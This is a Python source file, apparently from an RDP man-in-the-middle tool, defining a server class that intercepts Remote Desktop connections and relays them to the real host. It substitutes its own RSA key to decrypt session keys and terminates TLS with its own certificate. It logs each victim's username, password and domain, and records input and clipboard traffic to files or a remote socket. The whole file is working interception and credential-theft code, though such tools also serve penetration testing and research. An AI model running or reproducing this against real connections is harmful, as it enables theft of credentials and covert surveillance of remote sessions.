import datetime
import logging
import random
import socket

from Crypto.PublicKey import RSA
from twisted.internet import reactor
from twisted.internet.protocol import ClientFactory

from rdpy.core.ssl import ServerTLSContext
from rdpy.crypto.crypto import SecuritySettings, RC4CrypterProxy
from rdpy.enum.core import ParserMode
from rdpy.enum.rdp import NegotiationProtocols, RDPDataPDUSubtype, InputEventType, EncryptionMethod, EncryptionLevel, \
    RDPPlayerMessageType, CapabilityType, OrderFlag
from rdpy.enum.segmentation import SegmentationPDUType
from rdpy.enum.virtual_channel.virtual_channel import VirtualChannel
from rdpy.layer.mcs import MCSLayer
from rdpy.layer.raw import RawLayer
from rdpy.layer.rdp.data import RDPDataLayer
from rdpy.layer.rdp.fastpath import FastPathLayer
from rdpy.layer.rdp.security import TLSSecurityLayer, RDPSecurityLayer
from rdpy.layer.rdp.virtual_channel.clipboard import ClipboardLayer
from rdpy.layer.rdp.virtual_channel.virtual_channel import VirtualChannelLayer
from rdpy.layer.segmentation import SegmentationLayer
from rdpy.layer.tcp import TCPLayer
from rdpy.layer.tpkt import TPKTLayer
from rdpy.layer.x224 import X224Layer
from rdpy.mcs.channel import MCSChannelFactory, MCSServerChannel
from rdpy.mcs.server import MCSServerRouter
from rdpy.mcs.user import MCSUserObserver
from rdpy.mitm.client import MITMClient
from rdpy.mitm.observer import MITMSlowPathObserver, MITMFastPathObserver
from rdpy.mitm.virtual_channel.clipboard import MITMServerClipboardChannelObserver
from rdpy.mitm.virtual_channel.virtual_channel import MITMVirtualChannelObserver
from rdpy.parser.gcc import GCCParser
from rdpy.parser.rdp.client_info import RDPClientInfoParser
from rdpy.parser.rdp.connection import RDPClientConnectionParser, RDPServerConnectionParser
from rdpy.parser.rdp.fastpath import createFastPathParser
from rdpy.parser.rdp.negotiation import RDPNegotiationRequestParser, RDPNegotiationResponseParser
from rdpy.pdu.gcc import GCCConferenceCreateResponsePDU
from rdpy.pdu.mcs import MCSConnectResponsePDU
from rdpy.pdu.rdp.capability import MultifragmentUpdateCapability
from rdpy.pdu.rdp.connection import ProprietaryCertificate, ServerSecurityData, RDPServerDataPDU
from rdpy.pdu.rdp.negotiation import RDPNegotiationResponsePDU, RDPNegotiationRequestPDU
from rdpy.recording.observer import RecordingFastPathObserver
from rdpy.recording.recorder import Recorder, FileLayer, SocketLayer


class MITMServer(ClientFactory, MCSUserObserver, MCSChannelFactory):
    def __init__(self, friendlyName, targetHost, targetPort, certificateFileName, privateKeyFileName, recordHost, recordPort):
        MCSUserObserver.__init__(self)

        self.targetHost = targetHost
        self.targetPort = targetPort
        self.certificateFileName = certificateFileName
        self.privateKeyFileName = privateKeyFileName
        self.clipboardObserver = None
        self.useTLS = False
        self.client = None
        self.clientConnector = None
        self.originalNegotiationPDU = None
        self.targetNegotiationPDU = None
        self.serverData = None
        self.rc4RSAKey = RSA.generate(2048)
        self.crypter = RC4CrypterProxy()
        self.securitySettings = SecuritySettings(SecuritySettings.Mode.SERVER)
        self.securitySettings.addObserver(self.crypter)
        self.supportedChannels = []
        self.socket = None
        self.fileHandle = open("out/rdp_replay_{}_{}.rdpy".format(datetime.datetime.now().strftime('%Y%m%d_%H_%M%S'), random.randint(0, 1000)), "wb")
        self.log = logging.getLogger("mitm.server.%s" % friendlyName)
        self.connectionsLog = logging.getLogger("mitm.connections.%s" % friendlyName)
        self.friendlyName = friendlyName

        self.tcp = TCPLayer()
        self.tcp.createObserver(onConnection=self.onConnection, onDisconnection=self.onDisconnection)

        self.segmentation = SegmentationLayer()
        self.segmentation.createObserver(onUnknownHeader=self.onUnknownTPKTHeader)

        self.tpkt = TPKTLayer()

        self.x224 = X224Layer()
        self.x224.createObserver(onConnectionRequest=self.onConnectionRequest, onDisconnectRequest=self.onDisconnectRequest)

        self.mcs = MCSLayer()
        self.router = MCSServerRouter(self.mcs, self)
        self.mcs.addObserver(self.router)
        self.router.createObserver(
            onConnectionReceived=self.onConnectInitial,
            onDisconnectProviderUltimatum=self.onDisconnectProviderUltimatum,
            onAttachUserRequest=self.onAttachUserRequest,
            onChannelJoinRequest=self.onChannelJoinRequest
        )

        self.gcc = GCCParser()

        self.rdpClientInfoParser = RDPClientInfoParser()
        self.rdpClientConnectionParser = RDPClientConnectionParser()
        self.rdpServerConnectionParser = RDPServerConnectionParser()

        self.securityLayer = None
        self.io = RDPDataLayer()
        self.fastPathLayer = None

        self.tcp.setNext(self.segmentation)
        self.segmentation.attachLayer(SegmentationPDUType.TPKT, self.tpkt)
        self.tpkt.setNext(self.x224)
        self.x224.setNext(self.mcs)



        if recordHost is not None and recordPort is not None:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                self.socket.connect((recordHost, recordPort))
            except socket.error as e:
                self.log.error("Could not connect to liveplayer: {}".format(e))
                self.socket = None

        recordingLayers = [FileLayer(self.fileHandle)]
        if self.socket is not None:
            recordingLayers.append(SocketLayer(self.socket))

        # Since we're intercepting communications from the original client (so we're a server),
        # We need to write back the packets as if they came from the client.
        self.recorder = Recorder(recordingLayers)

    def getFriendlyName(self):
        return self.friendlyName

    def getProtocol(self):
        return self.tcp

    def getNegotiationPDU(self):
        return self.targetNegotiationPDU

    def buildProtocol(self, addr):
        # Build protocol for the client side of the connection
        self.client = MITMClient(self, self.fileHandle, self.socket)
        return self.client.getProtocol()

    def connectClient(self):
        # Connect the client side to the target machine
        self.clientConnector = reactor.connectTCP(self.targetHost, self.targetPort, self)

    def onConnection(self, clientInfo):
        """
        :param clientInfo: Tuple containing the ip and port of the connected client.
        """
        # Connection sequence #0
        self.log.debug("TCP connected from {}:{}".format(clientInfo[0], clientInfo[1]))

    def onDisconnection(self, reason):
        self.recorder.record(None, RDPPlayerMessageType.CONNECTION_CLOSE)
        self.log.debug("Connection closed: {}".format(reason))

        if self.client:
            self.client.disconnect()

        self.disconnectConnector()

    def onDisconnectRequest(self, pdu):
        self.log.debug("X224 Disconnect Request received")
        self.disconnect()

    def onDisconnectProviderUltimatum(self, pdu):
        self.log.debug("Disconnect Provider Ultimatum PDU received")
        self.disconnect()

    def disconnect(self):
        self.log.debug("Disconnecting")
        self.tcp.disconnect()
        self.disconnectConnector()

    def disconnectConnector(self):
        if self.clientConnector:
            self.clientConnector.disconnect()
            self.clientConnector = None

    def onUnknownTPKTHeader(self, header):
        self.log.error("Closing the connection because an unknown TPKT header was received. Header: 0x%02lx" % header)
        self.disconnect()

    def onConnectionRequest(self, pdu):
        # X224 Request
        self.log.debug("Connection Request received")

        # We need to save the original negotiation PDU because Windows will cut the connection if it sees that the requested protocols have changed.
        parser = RDPNegotiationRequestParser()
        self.originalNegotiationPDU = parser.parse(pdu.payload)

        if self.originalNegotiationPDU.cookie:
            self.log.info(self.originalNegotiationPDU.cookie)
        else:
            self.log.info("No cookie for this connection")

        self.targetNegotiationPDU = RDPNegotiationRequestPDU(
            self.originalNegotiationPDU.cookie,
            self.originalNegotiationPDU.flags,

            # Only SSL is implemented, so remove other protocol flags
            self.originalNegotiationPDU.requestedProtocols & NegotiationProtocols.SSL if self.originalNegotiationPDU.requestedProtocols is not None else None,

            self.originalNegotiationPDU.correlationFlags,
            self.originalNegotiationPDU.correlationID,
            self.originalNegotiationPDU.reserved,
        )

        self.connectClient()

    def onConnectionConfirm(self, _):
        # X224 Response
        protocols = NegotiationProtocols.SSL if self.originalNegotiationPDU.tlsSupported else NegotiationProtocols.NONE

        parser = RDPNegotiationResponseParser()
        payload = parser.write(RDPNegotiationResponsePDU(0x00, protocols))
        self.x224.sendConnectionConfirm(payload, source = 0x1234)

        if self.originalNegotiationPDU.tlsSupported:
            self.tcp.startTLS(ServerTLSContext(privateKeyFileName=self.privateKeyFileName, certificateFileName=self.certificateFileName))
            self.useTLS = True

    def onConnectInitial(self, pdu):
        # MCS Connect Initial
        """
        Parse the ClientData PDU and send a ServerData PDU back.
        :param pdu: The GCC ConferenceCreateResponse PDU that contains the ClientData PDU.
        """
        self.log.debug("Connect Initial received")
        gccConferenceCreateRequestPDU = self.gcc.parse(pdu.payload)

        # FIPS is not implemented, so remove this flag if it's set
        rdpClientDataPdu = self.rdpClientConnectionParser.parse(gccConferenceCreateRequestPDU.payload)
        rdpClientDataPdu.securityData.encryptionMethods &= ~EncryptionMethod.ENCRYPTION_FIPS
        rdpClientDataPdu.securityData.extEncryptionMethods &= ~EncryptionMethod.ENCRYPTION_FIPS

        self.client.onConnectInitial(gccConferenceCreateRequestPDU, rdpClientDataPdu)
        return True

    def onConnectResponse(self, pdu, serverData):
        # MCS Connect Response
        """
        :type pdu: MCSConnectResponsePDU
        :type serverData: RDPServerDataPDU
        """
        if pdu.result != 0:
            self.mcs.send(pdu)
            return

        # Replace the server's public key with our own key so we can decrypt the incoming client random
        cert = serverData.security.serverCertificate
        if cert:
            cert = ProprietaryCertificate(
                cert.signatureAlgorithmID,
                cert.keyAlgorithmID,
                cert.publicKeyType,
                self.rc4RSAKey,
                cert.signatureType,
                cert.signature,
                cert.padding
            )

        security = ServerSecurityData(
            # FIPS is not implemented so avoid using that
            serverData.security.encryptionMethod if serverData.security.encryptionMethod != EncryptionMethod.ENCRYPTION_FIPS else EncryptionMethod.ENCRYPTION_128BIT,
            serverData.security.encryptionLevel if serverData.security.encryptionLevel != EncryptionLevel.ENCRYPTION_LEVEL_FIPS else EncryptionLevel.ENCRYPTION_LEVEL_HIGH,
            serverData.security.serverRandom,
            cert
        )

        serverData.core.clientRequestedProtocols = self.originalNegotiationPDU.requestedProtocols

        self.securitySettings.serverSecurityReceived(security)
        self.serverData = RDPServerDataPDU(serverData.core, security, serverData.network)

        rdpParser = RDPServerConnectionParser()
        gccParser = GCCParser()

        gcc = self.client.conferenceCreateResponse
        gcc = GCCConferenceCreateResponsePDU(gcc.nodeID, gcc.tag, gcc.result, rdpParser.write(self.serverData))
        pdu = MCSConnectResponsePDU(pdu.result, pdu.calledConnectID, pdu.domainParams, gccParser.write(gcc))
        self.mcs.send(pdu)

    def onAttachUserRequest(self, _):
        # MCS Attach User Request
        self.client.onAttachUserRequest()

    def onAttachConfirmed(self, user):
        # MCS Attach User Confirm successful
        self.router.sendAttachUserConfirm(True, user.userID)

    def onAttachRefused(self, user, result):
        # MCS Attach User Confirm failed
        self.router.sendAttachUserConfirm(False, result)

    def onChannelJoinRequest(self, pdu):
        # MCS Channel Join Request
        self.client.onChannelJoinRequest(pdu)

    def onChannelJoinAccepted(self, userID, channelID):
        # MCS Channel Join Confirm successful
        self.router.sendChannelJoinConfirm(0, userID, channelID)

    def onChannelJoinRefused(self, user, result, channelID):
        # MCS Channel Join Confirm failed
        self.router.sendChannelJoinConfirm(result, user.userID, channelID)

    def buildChannel(self, mcs, userID, channelID):
        self.log.debug("building channel {} for user {}".format(channelID, userID))

        channelMap = self.client.channelMap
        if channelID == self.serverData.network.mcsChannelID:
            return self.buildIOChannel(mcs, userID, channelID)
        elif channelID in channelMap.keys() and channelMap[channelID] == VirtualChannel.CLIPBOARD:
            return self.buildClipboardChannel(mcs, userID, channelID)
        else:
            return self.buildVirtualChannel(mcs, userID, channelID)

    def createSecurityLayer(self):
        encryptionMethod = self.serverData.security.encryptionMethod

        if self.useTLS:
            return TLSSecurityLayer()
        else:
            return RDPSecurityLayer.create(encryptionMethod, self.crypter)

    def buildVirtualChannel(self, mcs, userID, channelID):
        channel = MCSServerChannel(mcs, userID, channelID)
        securityLayer = self.createSecurityLayer()
        rawLayer = RawLayer()

        channel.setNext(securityLayer)
        securityLayer.setNext(rawLayer)

        peer = self.client.getChannelObserver(channelID)
        observer = MITMVirtualChannelObserver(rawLayer)
        observer.setPeer(peer)
        rawLayer.addObserver(observer)

        return channel

    def buildClipboardChannel(self, mcs, userID, channelID):
        """
        :type mcs: MCSLayer
        :param userID: The mcs user that builds the channel
        :param channelID: The channel ID to use to communicate in that channel
        :return: MCSServerChannel that handles the Clipboard virtual channel traffic from the client to the MITM.
        """
        # Create all necessary layers
        channel = MCSServerChannel(mcs, userID, channelID)
        securityLayer = self.createSecurityLayer()
        virtualChannelLayer = VirtualChannelLayer()
        clipboardLayer = ClipboardLayer()

        # Link layers together in the good order: MCS --> Security --> VirtualChannel --> Clipboard
        channel.setNext(securityLayer)
        securityLayer.setNext(virtualChannelLayer)
        virtualChannelLayer.setNext(clipboardLayer)

        # Create and link the MITM Observer for the server side to the clipboard layer.
        # Also link both MITM Observers (client and server) so they can send traffic the other way.
        peer = self.client.getChannelObserver(channelID)
        observer = MITMServerClipboardChannelObserver(clipboardLayer, self.recorder,
                                                      self.client.clipboardObserver)
        observer.setPeer(peer)
        clipboardLayer.addObserver(observer)

        return channel

    def buildIOChannel(self, mcs, userID, channelID):
        encryptionMethod = self.serverData.security.encryptionMethod
        self.securityLayer = self.createSecurityLayer()
        self.securityLayer.createObserver(
            onClientInfoReceived=self.onClientInfoReceived,
            onSecurityExchangeReceived=self.onSecurityExchangeReceived,
            onLicensingDataReceived=self.onLicensingDataReceived
        )

        slowPathObserver = MITMSlowPathObserver(self.log, self.io, onConfirmActive=self.onConfirmActive)
        slowPathObserver.setDataHandler(RDPDataPDUSubtype.PDUTYPE2_INPUT, self.onInputPDUReceived)
        clientObserver = self.client.getChannelObserver(channelID)
        slowPathObserver.setPeer(clientObserver)
        self.io.addObserver(slowPathObserver)

        fastPathParser = createFastPathParser(self.useTLS, encryptionMethod, self.crypter, ParserMode.SERVER)
        self.fastPathLayer = FastPathLayer(fastPathParser)
        fastPathObserver = MITMFastPathObserver(self.log, self.fastPathLayer)
        fastPathObserver.setPeer(self.client.getFastPathObserver())
        self.fastPathLayer.addObserver(fastPathObserver)
        self.fastPathLayer.addObserver(RecordingFastPathObserver(self.recorder, RDPPlayerMessageType.INPUT))

        channel = MCSServerChannel(mcs, userID, channelID)
        channel.setNext(self.securityLayer)
        self.securityLayer.setNext(self.io)

        self.segmentation.attachLayer(SegmentationPDUType.FAST_PATH, self.fastPathLayer)

        if self.useTLS:
            self.securityLayer.securityHeaderExpected = True

        return channel

    def onConfirmActive(self, pdu):
        # Force RDP server to send bitmap events instead of order events.
        pdu.parsedCapabilitySets[CapabilityType.CAPSTYPE_ORDER].orderFlags = OrderFlag.NEGOTIATEORDERSUPPORT | OrderFlag.ZEROBOUNDSDELTASSUPPORT
        pdu.parsedCapabilitySets[CapabilityType.CAPSTYPE_ORDER].orderSupport = b"\x00" * 32

        pdu.parsedCapabilitySets[CapabilityType.CAPSETTYPE_MULTIFRAGMENTUPDATE] = MultifragmentUpdateCapability(0)
        self.recorder.record(pdu, RDPPlayerMessageType.CONFIRM_ACTIVE)

    # Security Exchange
    def onSecurityExchangeReceived(self, pdu):
        """
        :type pdu: RDPSecurityExchangePDU
        :return:
        """
        self.log.debug("Security Exchange received")
        clientRandom = self.rc4RSAKey.decrypt(pdu.clientRandom[:: -1])[:: -1]
        self.securitySettings.setClientRandom(clientRandom)

    # Client Info Packet
    def onClientInfoReceived(self, data):
        """
        Called when client info data is received.
        Record the PDU and send it to the MITMClient.
        :type data: bytes
        """
        pdu = RDPClientInfoParser().parse(data)

        self.log.debug("Client Info received: {}".format(pdu))
        self.connectionsLog.info("CLIENT INFO RECEIVED")
        self.connectionsLog.info("USER: {}".format(pdu.username))
        self.connectionsLog.info("PASSWORD: {}".format(pdu.password))
        self.connectionsLog.info("DOMAIN: {}".format(pdu.domain))

        self.recorder.record(pdu, RDPPlayerMessageType.CLIENT_INFO)
        self.client.onClientInfoPDUReceived(pdu)

    def onLicensingDataReceived(self, data):
        self.log.debug("Sending Licensing data")

        if self.useTLS:
            self.securityLayer.securityHeaderExpected = False

        self.securityLayer.sendLicensing(data)

    def sendDisconnectProviderUltimatum(self, pdu):
        self.mcs.send(pdu)

    def onInputPDUReceived(self, pdu):
        # Unsure if still useful
        for event in pdu.events:
            if event.messageType == InputEventType.INPUT_EVENT_SCANCODE:
                self.log.debug("Key pressed: 0x%2lx" % event.keyCode)
            elif event.messageType == InputEventType.INPUT_EVENT_MOUSE:
                self.log.debug("Mouse position: x = %d, y = %d" % (event.x, event.y))